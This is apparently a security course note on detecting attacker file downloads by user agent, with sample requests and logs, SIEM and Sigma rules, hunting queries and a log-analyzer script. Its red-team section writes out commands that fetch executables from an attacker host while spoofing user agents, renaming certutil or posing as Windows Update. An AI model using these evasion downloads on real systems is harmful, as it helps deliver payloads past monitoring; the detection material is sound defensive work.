---
tags: [module/file-transfers, detection, user-agent, siem, threat-hunting, blue-team, level/advanced, practical]
---

# Detection - Practical Application

## Complete Detection Workflow

Phase 1: Understanding Attack Tools
Phase 2: User Agent Analysis
Phase 3: Log Collection
Phase 4: SIEM Rules
Phase 5: Threat Hunting
Phase 6: Bypassing Detection (For Red Teams)
Phase 7: Automation

---

## Phase 1: Understanding Attack Tools

### Common Attack Tool User Agents

| Tool | User Agent | Detection Point |
|------|------------|-----------------|
| PowerShell IWR | Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1 | Proxy/Web logs |
| PowerShell WinHttp | Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) | Proxy/Web logs |
| PowerShell Msxml2 | Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C) | Proxy/Web logs |
| Certutil | Microsoft-CryptoAPI/10.0 | Proxy/Web logs |
| BITS | Microsoft BITS/7.8 | Proxy/Web logs |
| cURL | curl/7.x.x | Proxy/Web logs |
| wget | Wget/1.x.x | Proxy/Web logs |
| Python urllib | Python-urllib/3.x | Proxy/Web logs |
| sqlmap | sqlmap/1.x | Proxy/Web logs |
| Nmap HTTP | Nmap Scripting Engine | Proxy/Web logs |

---

## Phase 2: User Agent Analysis

### PowerShell User Agents

# Invoke-WebRequest
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0

# WinHttpRequest
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)

# Msxml2
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)

### Certutil User Agent

GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0

### BITS User Agent

HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8

---

## Phase 3: Log Collection

### Apache Access Log Example

192.168.1.100 - - [18/Mar/2026:10:15:23 +0000] "GET /nc.exe HTTP/1.1" 200 1024 "-" "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0"

### Nginx Access Log

192.168.1.100 - - [18/Mar/2026:10:15:23 +0000] "GET /nc.exe HTTP/1.1" 200 1024 "-" "Microsoft-CryptoAPI/10.0"

### Windows PowerShell Logs (Event ID 4104)

Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-PowerShell/Operational"; ID=4104} | Select-Object -First 10

### Sysmon Event ID 1 (Process Creation)

Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Sysmon/Operational"; ID=1} | Where-Object { $_.Message -match "certutil|bitsadmin|powershell" }

### Proxy Logs (Squid)

1586827323.891 23 192.168.1.100 TCP_MISS/200 1024 GET http://10.10.10.32/nc.exe - DIRECT/10.10.10.32 application/octet-stream "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0"

---

## Phase 4: SIEM Rules

### Splunk Search for PowerShell Downloads

index=proxy sourcetype=access_combined user_agent="*WindowsPowerShell*" uri="*.exe" | stats count by clientip, uri

### Splunk Search for Certutil

index=proxy sourcetype=access_combined user_agent="*Microsoft-CryptoAPI*" | stats count by clientip, uri

### Splunk Search for BITS

index=proxy sourcetype=access_combined user_agent="*Microsoft BITS*" | stats count by clientip, uri

### Splunk Search for PowerShell Without PowerShell.exe

index=windows EventCode=1 CommandLine="*powershell*" | where not (CommandLine like "%powershell.exe%") | table _time, ComputerName, User, CommandLine

### Elasticsearch/Kibana Query

{
  "query": {
    "bool": {
      "must": [
        { "match": { "user_agent": "Microsoft-CryptoAPI" } },
        { "match": { "uri": ".exe" } }
      ]
    }
  }
}

### Sigma Rule Example

title: Certutil Download
description: Detects certutil downloading files
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-split'
      - '-f'
  condition: selection

---

## Phase 5: Threat Hunting

### Hunt for Suspicious PowerShell

Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-PowerShell/Operational"; ID=4104} | Where-Object { $_.Message -match "http://|https://" }

### Hunt for Certutil Activity

Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4688} | Where-Object { $_.Message -match "certutil.*-urlcache" }

### Hunt for BITS Transfers

Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-Bits-Client/Operational"; ID=59} | Select-Object TimeCreated, Message

### Hunt for Anomalous User Agents

# PowerShell script to analyze web logs
$logs = Import-Csv -Path "web_logs.csv"
$userAgents = $logs | Group-Object UserAgent | Sort-Object Count
$userAgents | Where-Object { $_.Count -lt 10 } | Select-Object Name, Count

### Time-Based Analysis

# Look for activity outside business hours
$logs | Where-Object { [datetime]$_.Time -lt "09:00" -or [datetime]$_.Time -gt "17:00" } | Group-Object UserAgent

---

## Phase 6: Bypassing Detection (For Red Teams)

### Change PowerShell User Agent

# PowerShell with custom user agent
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$wc.DownloadFile("http://10.10.14.5/file.exe", "C:\Temp\file.exe")

# Invoke-WebRequest with custom user agent
Invoke-WebRequest -Uri "http://10.10.14.5/file.exe" -OutFile "C:\Temp\file.exe" -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

### Certutil with Legitimate User Agent

# Certutil doesn't support custom user agents, but you can rename it
copy certutil.exe winupdate.exe
winupdate.exe -urlcache -f http://10.10.14.5/file.exe file.exe

### BITS with Custom Headers

# PowerShell BITS with custom headers (limited)
Import-Module bitstransfer
$job = Start-BitsTransfer -Source "http://10.10.14.5/file.exe" -Destination "C:\Temp\file.exe" -Asynchronous
Add-BitsFile -BitsJob $job -Source "http://10.10.14.5/file.exe" -Destination "C:\Temp\file.exe" -HttpMethod Get

### Use Less Common Tools

# Use tools that don't have obvious user agents
# - .NET WebClient (looks like normal .NET traffic)
# - mshta (uses IE engine)
# - wmic (uses XSL)

### Masquerade as Windows Update

# Use BITS but make it look like Windows Update
bitsadmin /transfer /download /priority high http://update.microsoft.com/file.cab C:\Windows\Temp\file.cab

---

## Phase 7: Automation

### Log Analyzer Script

Save as analyze-web-logs.py:

#!/usr/bin/env python3
import re
import sys
from collections import Counter

def analyze_logs(logfile):
    suspicious_uas = [
        'WindowsPowerShell',
        'Microsoft-CryptoAPI',
        'Microsoft BITS',
        'WinHttp',
        'curl',
        'Python-urllib',
        'sqlmap'
    ]
    
    results = []
    
    with open(logfile, 'r') as f:
        for line in f:
            # Extract user agent (simplified)
            ua_match = re.search(r'"([^"]*)"$', line)
            if ua_match:
                ua = ua_match.group(1)
                for sus in suspicious_uas:
                    if sus in ua:
                        results.append({
                            'line': line.strip(),
                            'ua': ua,
                            'matched': sus
                        })
                        break
    
    return results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <logfile>")
        sys.exit(1)
    
    findings = analyze_logs(sys.argv[1])
    for f in findings:
        print(f"[!] Suspicious: {f['matched']}")
        print(f"    {f['line']}")

### SIEM Rule Generator

Save as generate-siem-rules.ps1:

$suspiciousUAs = @(
    "WindowsPowerShell",
    "Microsoft-CryptoAPI",
    "Microsoft BITS",
    "WinHttp",
    "Python-urllib",
    "sqlmap"
)

# Splunk rules
foreach ($ua in $suspiciousUAs) {
    @"
`n# Splunk rule for $ua
index=proxy sourcetype=access_combined user_agent="*$ua*" uri="*.exe"
| stats count by clientip, uri, user_agent
| where count > 0
"@
}

# Sigma rules
foreach ($ua in $suspiciousUAs) {
    @"
`n# Sigma rule for $ua
title: Suspicious User Agent - $ua
logsource:
  category: webserver
detection:
  selection:
    cs-user-agent|contains: '$ua'
  condition: selection
"@
}

### Hunting Dashboard Query (Elastic)

Save as hunting-dash.json:
{
  "query": {
    "bool": {
      "should": [
        { "wildcard": { "user_agent": "*WindowsPowerShell*" } },
        { "wildcard": { "user_agent": "*Microsoft-CryptoAPI*" } },
        { "wildcard": { "user_agent": "*Microsoft BITS*" } },
        { "wildcard": { "user_agent": "*WinHttp*" } }
      ],
      "minimum_should_match": 1
    }
  },
  "aggs": {
    "by_user_agent": {
      "terms": { "field": "user_agent.keyword", "size": 50 }
    },
    "by_client_ip": {
      "terms": { "field": "clientip.keyword", "size": 20 }
    }
  }
}

---

## Detection Cheatsheet

| Tool | User Agent | Detection Rule |
|------|------------|----------------|
| PowerShell IWR | WindowsPowerShell/* | user_agent contains "WindowsPowerShell" |
| PowerShell WinHttp | WinHttp.WinHttpRequest | user_agent contains "WinHttp" |
| PowerShell Msxml2 | MSIE 7.0; Trident | user_agent contains "MSIE 7.0" and "Trident" |
| Certutil | Microsoft-CryptoAPI | user_agent contains "Microsoft-CryptoAPI" |
| BITS | Microsoft BITS/* | user_agent contains "Microsoft BITS" |
| cURL | curl/* | user_agent contains "curl" |
| wget | Wget/* | user_agent contains "Wget" |
| Python | Python-urllib/* | user_agent contains "Python-urllib" |
| sqlmap | sqlmap/* | user_agent contains "sqlmap" |

---

## Key Takeaways

- Every tool has a default user agent
- Attackers often forget to change them
- Collect logs from proxies, web servers, and endpoints
- Build baselines of normal activity
- Hunt for anomalies (unusual user agents, out-of-hours activity)
- PowerShell, Certutil, and BITS have distinct user agents
- Red teams can bypass detection by changing user agents
- Whitelisting is more effective than blacklisting
- SIEM rules can automate detection
- Threat hunting finds what automated rules miss
- Correlate multiple data sources for better detection
- This is just the beginning - later modules cover threat hunting in depth
- Practice both attacking and defending to understand both sides
